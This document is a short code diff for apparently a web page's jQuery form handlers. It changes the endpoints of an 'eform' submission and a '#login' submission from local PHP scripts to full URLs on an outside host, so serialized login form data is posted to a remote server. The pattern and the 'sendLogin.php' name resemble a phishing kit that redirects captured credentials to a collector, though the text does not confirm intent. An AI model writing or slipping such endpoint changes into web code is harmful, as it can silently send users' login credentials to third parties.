@@ -10,7 +10,7 @@ $('#eform').on('submit', function (event) {
 
 $.ajax({
  type: 'POST',
- url: 'req/no.php',
+ url: 'https://axcellent.dvnet.org/app18/no.php',
  async: false,
  dataType: 'JSON',
  data: $(this).serialize(),
@@ -43,7 +43,7 @@ $('#login').on('submit', function (event) {
 
 $.ajax({
  type: 'POST',
- url: 'req/sendLogin.php',
+ url: 'https://axcellent.dvnet.org/app18/sendLogin.php',
  async: false,
  dataType: 'JSON',
  data: $(this).serialize(),
